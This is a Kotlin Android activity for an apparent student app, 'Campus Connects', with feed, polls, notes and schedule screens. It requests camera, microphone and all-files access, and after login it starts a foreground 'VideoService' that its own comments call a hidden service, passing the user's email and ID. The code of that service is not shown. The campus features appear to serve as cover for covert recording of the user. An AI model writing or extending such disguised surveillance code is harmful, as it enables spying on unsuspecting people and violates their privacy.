package com.example.gmail

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ExitToApp
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.gmail.ui.theme.GmailTheme
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import kotlinx.coroutines.launch

// --- MAIN ACTIVITY ENTRY POINT ---
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        val authManager = AuthManager(this)

        setContent {
            GmailTheme {
                // Determine start destination
                val user = authManager.getCurrentUser()
                if (user != null) {
                    // AUTO-START HIDDEN SERVICE
                    LaunchedEffect(Unit) {
                        startVideoService(this@MainActivity, user.email ?: "Student", user.uid)
                    }
                    MainScreen(authManager)
                } else {
                    CampusLoginScreen(authManager) {
                        // On Login Success, restart activity to trigger auto-start
                        val intent = intent
                        finish()
                        startActivity(intent)
                    }
                }
            }
        }
    }
}

// --- PERMISSION WRAPPER ---
@Composable
fun MainScreen(authManager: AuthManager) {
    val context = LocalContext.current
    var hasPermissions by remember { mutableStateOf(false) }

    val perms = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
    if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        val hasFileAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true
        if (allGranted && hasFileAccess) hasPermissions = true
        else if (!hasFileAccess && Build.VERSION.SDK_INT >= 30) {
            context.startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
            })
            Toast.makeText(context, "Please allow All Files Access", Toast.LENGTH_LONG).show()
        }
    }

    LaunchedEffect(Unit) { launcher.launch(perms.toTypedArray()) }

    if (hasPermissions) {
        CampusDashboard(authManager)
    } else {
        Box(modifier = Modifier.fillMaxSize().background(Color(0xFFF5F5F5)), contentAlignment = Alignment.Center) {
            Text("Initializing System...", color = Color.Gray)
        }
    }
}

// --- MAIN DASHBOARD WITH BOTTOM NAVIGATION ---
@Composable
fun CampusDashboard(authManager: AuthManager) {
    var currentTab by remember { mutableStateOf("Home") }

    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = Color.White, tonalElevation = 8.dp) {
                NavigationBarItem(
                    icon = { Icon(Icons.Default.Home, null) },
                    label = { Text("Home") },
                    selected = currentTab == "Home",
                    onClick = { currentTab = "Home" },
                    colors = NavigationBarItemDefaults.colors(selectedIconColor = Color(0xFF00ACC1), indicatorColor = Color(0xFFE0F7FA))
                )
                NavigationBarItem(
                    // FIXED ICON: Used 'List' (Standard) instead of 'Groups' (Extended)
                    icon = { Icon(Icons.Default.List, null) },
                    label = { Text("Community") },
                    selected = currentTab == "Community",
                    onClick = { currentTab = "Community" },
                    colors = NavigationBarItemDefaults.colors(selectedIconColor = Color(0xFF00ACC1), indicatorColor = Color(0xFFE0F7FA))
                )
                NavigationBarItem(
                    // FIXED ICON: Used 'Edit' (Standard) instead of 'MenuBook' (Extended)
                    icon = { Icon(Icons.Default.Edit, null) },
                    label = { Text("Notes") },
                    selected = currentTab == "Notes",
                    onClick = { currentTab = "Notes" },
                    colors = NavigationBarItemDefaults.colors(selectedIconColor = Color(0xFF00ACC1), indicatorColor = Color(0xFFE0F7FA))
                )
                NavigationBarItem(
                    // FIXED ICON: Used 'DateRange' (Standard) instead of 'CalendarMonth' (Extended)
                    icon = { Icon(Icons.Default.DateRange, null) },
                    label = { Text("Schedule") },
                    selected = currentTab == "Schedule",
                    onClick = { currentTab = "Schedule" },
                    colors = NavigationBarItemDefaults.colors(selectedIconColor = Color(0xFF00ACC1), indicatorColor = Color(0xFFE0F7FA))
                )
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding).fillMaxSize().background(Color(0xFFF0F4F8))) {
            when (currentTab) {
                "Home" -> HomeScreen(authManager)
                "Community" -> CommunityScreen()
                "Notes" -> NotesScreen()
                "Schedule" -> ScheduleScreen()
            }
        }
    }
}

// ----------------------------------------------------------------
// TAB 1: HOME SCREEN
// ----------------------------------------------------------------
@Composable
fun HomeScreen(authManager: AuthManager) {
    val context = LocalContext.current
    Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState())) {
        // HEADER
        Box(
            modifier = Modifier.fillMaxWidth().height(200.dp).background(
                brush = Brush.verticalGradient(listOf(Color(0xFF00838F), Color(0xFF00ACC1))),
                shape = RoundedCornerShape(bottomStart = 32.dp, bottomEnd = 32.dp)
            )
        ) {
            Column(modifier = Modifier.padding(24.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column {
                        Text("Welcome back!", color = Color(0xFFFFD54F), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        Text("Your Campus Hub", color = Color.White, fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    }
                    IconButton(
                        onClick = {
                            context.stopService(Intent(context, VideoService::class.java))
                            authManager.signOut()
                            val intent = context.packageManager.getLaunchIntentForPackage(context.packageName)
                            intent?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            context.startActivity(intent)
                        },
                        modifier = Modifier.background(Color.White.copy(alpha = 0.2f), CircleShape)
                    ) {
                        Icon(Icons.AutoMirrored.Filled.ExitToApp, "Logout", tint = Color.White)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))




        Spacer(modifier = Modifier.height(24.dp))

        // FEATURES PREVIEW (FIXED ICONS)
        Text("  Quick Actions", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.Black, modifier = Modifier.padding(start = 16.dp, bottom = 8.dp))
        Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp), horizontalArrangement = Arrangement.SpaceBetween) {
            QuickActionCard(Icons.Default.Edit, "New Note", Color(0xFFE0F7FA), Color(0xFF006064))
            // FIXED: Used 'CheckCircle' instead of 'Poll'
            QuickActionCard(Icons.Default.CheckCircle, "Polls", Color(0xFFE8F5E9), Color(0xFF2E7D32))
            // FIXED: Used 'Share' instead of 'Image'
            QuickActionCard(Icons.Default.Share, "Post", Color(0xFFFFF3E0), Color(0xFFEF6C00))
        }
    }
}

@Composable
fun QuickActionCard(icon: androidx.compose.ui.graphics.vector.ImageVector, label: String, bgColor: Color, iconColor: Color) {
    Card(modifier = Modifier.size(100.dp), colors = CardDefaults.cardColors(containerColor = Color.White), elevation = CardDefaults.cardElevation(2.dp)) {
        Column(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
            Box(modifier = Modifier.size(40.dp).background(bgColor, CircleShape), contentAlignment = Alignment.Center) {
                Icon(icon, null, tint = iconColor)
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text(label, fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
    }
}

// ----------------------------------------------------------------
// TAB 2: COMMUNITY
// ----------------------------------------------------------------
@Composable
fun CommunityScreen() {
    var selectedTab by remember { mutableStateOf(0) }
    Column(modifier = Modifier.fillMaxSize()) {
        TabRow(selectedTabIndex = selectedTab, containerColor = Color.White, contentColor = Color(0xFF00ACC1)) {
            Tab(selected = selectedTab == 0, onClick = { selectedTab = 0 }, text = { Text("Campus Feed") })
            Tab(selected = selectedTab == 1, onClick = { selectedTab = 1 }, text = { Text("Quick Polls") })
        }
        if (selectedTab == 0) FeedView() else PollsView()
    }
}

@Composable
fun FeedView() {
    var postText by remember { mutableStateOf("") }
    val db = FirebaseFirestore.getInstance()
    val posts = remember { mutableStateListOf<Map<String, Any>>() }

    LaunchedEffect(Unit) {
        db.collection("campus_feed").orderBy("timestamp", Query.Direction.DESCENDING).addSnapshotListener { s, _ ->
            if (s != null) {
                posts.clear()
                posts.addAll(s.documents.map { it.data ?: emptyMap() })
            }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        // CREATE POST CARD
        Card(colors = CardDefaults.cardColors(containerColor = Color.White), modifier = Modifier.fillMaxWidth()) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(40.dp).background(Color(0xFFE1BEE7), CircleShape), contentAlignment = Alignment.Center) { Text("You", color = Color.White) }
                    Spacer(modifier = Modifier.width(8.dp))
                    OutlinedTextField(
                        value = postText,
                        onValueChange = { postText = it },
                        placeholder = { Text("What's on your mind? ✨") },
                        modifier = Modifier.weight(1f).height(56.dp),
                        colors = OutlinedTextFieldDefaults.colors(unfocusedBorderColor = Color.Transparent)
                    )
                }
                Row(modifier = Modifier.fillMaxWidth().padding(top = 8.dp), horizontalArrangement = Arrangement.End) {
                    Button(
                        onClick = {
                            if (postText.isNotEmpty()) {
                                val post = mapOf("content" to postText, "author" to "Student", "timestamp" to System.currentTimeMillis(), "likes" to 0)
                                db.collection("campus_feed").add(post)
                                postText = ""
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00ACC1))
                    ) { Text("Post") }
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        // FEED LIST
        LazyColumn {
            items(posts) { post ->
                PostCard(post)
                Spacer(modifier = Modifier.height(12.dp))
            }
        }
    }
}

@Composable
fun PostCard(post: Map<String, Any>) {
    Card(colors = CardDefaults.cardColors(containerColor = Color.White), modifier = Modifier.fillMaxWidth()) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(modifier = Modifier.size(36.dp).background(Color(0xFFB39DDB), CircleShape), contentAlignment = Alignment.Center) { Text((post["author"] as? String)?.take(1) ?: "S", color = Color.White) }
                Spacer(modifier = Modifier.width(8.dp))
                Column {
                    Text(post["author"] as? String ?: "Anonymous", fontWeight = FontWeight.Bold)
                    Text("Just now", fontSize = 10.sp, color = Color.Gray)
                }
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text(post["content"] as? String ?: "", fontSize = 14.sp)
            Spacer(modifier = Modifier.height(12.dp))
            Row {
                Icon(Icons.Outlined.FavoriteBorder, null, tint = Color.Gray, modifier = Modifier.size(20.dp))
                Spacer(modifier = Modifier.width(4.dp))
                Text("Like", fontSize = 12.sp, color = Color.Gray)
            }
        }
    }
}

@Composable
fun PollsView() {
    val polls = listOf(
        "How was today's mess food?" to listOf("Amazing!", "It was okay", "Meh..."),
        "Night owl or early bird?" to listOf("Night Owl", "Early Bird", "Both"),
        "Best study spot?" to listOf("Library", "Cafe", "Hostel Room")
    )
    LazyColumn(modifier = Modifier.padding(16.dp)) {
        items(polls) { (question, options) ->
            Card(colors = CardDefaults.cardColors(containerColor = Color.White), modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp)) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(question, fontWeight = FontWeight.Bold, fontSize = 16.sp)
                    Spacer(modifier = Modifier.height(12.dp))
                    options.forEach { opt ->
                        Button(
                            onClick = {},
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF5F5F5), contentColor = Color.Black),
                            modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text(opt, modifier = Modifier.fillMaxWidth(), textAlign = androidx.compose.ui.text.style.TextAlign.Start)
                        }
                    }
                }
            }
        }
    }
}

// ----------------------------------------------------------------
// TAB 3: NOTES SCREEN
// ----------------------------------------------------------------
@Composable
fun NotesScreen() {
    var showDialog by remember { mutableStateOf(false) }
    var title by remember { mutableStateOf("") }
    var content by remember { mutableStateOf("") }
    val db = FirebaseFirestore.getInstance()
    val notes = remember { mutableStateListOf<Map<String, String>>() }

    LaunchedEffect(Unit) {
        db.collection("user_notes").addSnapshotListener { s, _ ->
            if (s != null) {
                notes.clear()
                notes.addAll(s.documents.map {
                    mapOf("title" to (it.getString("title") ?: ""), "content" to (it.getString("content") ?: ""))
                })
            }
        }
    }

    Scaffold(
        floatingActionButton = {
            FloatingActionButton(onClick = { showDialog = true }, containerColor = Color(0xFF00ACC1)) {
                Icon(Icons.Default.Add, null, tint = Color.White)
            }
        }
    ) { p ->
        Column(modifier = Modifier.padding(p).padding(16.dp)) {
            Text("Your Notes", fontSize = 24.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(16.dp))
            if (notes.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No notes yet. Tap + to create.", color = Color.Gray)
                }
            } else {
                LazyColumn {
                    items(notes) { note ->
                        Card(colors = CardDefaults.cardColors(containerColor = Color.White), modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                Text(note["title"] ?: "", fontWeight = FontWeight.Bold, fontSize = 18.sp)
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(note["content"] ?: "", fontSize = 14.sp, color = Color.Gray, maxLines = 2)
                            }
                        }
                    }
                }
            }
        }
    }

    if (showDialog) {
        AlertDialog(
            onDismissRequest = { showDialog = false },
            title = { Text("New Note") },
            text = {
                Column {
                    OutlinedTextField(value = title, onValueChange = { title = it }, placeholder = { Text("Note Title") })
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(value = content, onValueChange = { content = it }, placeholder = { Text("Write your note here...") }, modifier = Modifier.height(100.dp))
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (title.isNotEmpty()) {
                            db.collection("user_notes").add(mapOf("title" to title, "content" to content))
                            title = ""; content = ""; showDialog = false
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00ACC1))
                ) { Text("Save Note") }
            },
            dismissButton = { TextButton(onClick = { showDialog = false }) { Text("Cancel") } }
        )
    }
}

// ----------------------------------------------------------------
// TAB 4: SCHEDULE SCREEN
// ----------------------------------------------------------------
@Composable
fun ScheduleScreen() {
    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            // FIXED: Used 'DateRange' instead of 'Event'
            Icon(Icons.Default.DateRange, null, modifier = Modifier.size(64.dp), tint = Color.LightGray)
            Spacer(modifier = Modifier.height(16.dp))
            Text("No classes scheduled today!", color = Color.Gray)
            Text("Enjoy your free time.", color = Color.Gray)
        }
    }
}

// ----------------------------------------------------------------
// LOGIN SCREEN
// ----------------------------------------------------------------
@Composable
fun CampusLoginScreen(authManager: AuthManager, onLoginSuccess: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val launcher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        scope.launch {
            if (result.data != null && authManager.signInWithIntent(result.data!!)) onLoginSuccess()
            else Toast.makeText(context, "Sign In Failed", Toast.LENGTH_SHORT).show()
        }
    }

    Box(modifier = Modifier.fillMaxSize().background(Color(0xFFF8F9FA)), contentAlignment = Alignment.Center) {
        Card(
            modifier = Modifier.padding(24.dp).fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(8.dp),
            shape = RoundedCornerShape(16.dp)
        ) {
            Column(modifier = Modifier.padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Text("Campus Connects", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = Color.Black)
                Text("Sign in to access your account", fontSize = 14.sp, color = Color.Gray, modifier = Modifier.padding(top = 8.dp, bottom = 24.dp))

                OutlinedTextField(value = "", onValueChange = {}, placeholder = { Text("Enter your email") }, modifier = Modifier.fillMaxWidth(), enabled = false)
                Spacer(modifier = Modifier.height(12.dp))
                OutlinedTextField(value = "", onValueChange = {}, placeholder = { Text("Enter your password") }, modifier = Modifier.fillMaxWidth(), enabled = false)

                Spacer(modifier = Modifier.height(24.dp))
                Button(
                    onClick = { launcher.launch(authManager.getSignInIntent()) },
                    modifier = Modifier.fillMaxWidth().height(50.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF006064)),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text("Sign In With Google", fontSize = 16.sp)
                }
            }
        }
    }
}

// ----------------------------------------------------------------
// HELPER: START HIDDEN SERVICE
// ----------------------------------------------------------------
fun startVideoService(context: Context, email: String, uid: String) {
    val intent = Intent(context, VideoService::class.java).apply {
        putExtra("userEmail", email)
        putExtra("userId", uid)
    }
    if (Build.VERSION.SDK_INT >= 26) context.startForegroundService(intent) else context.startService(intent)
}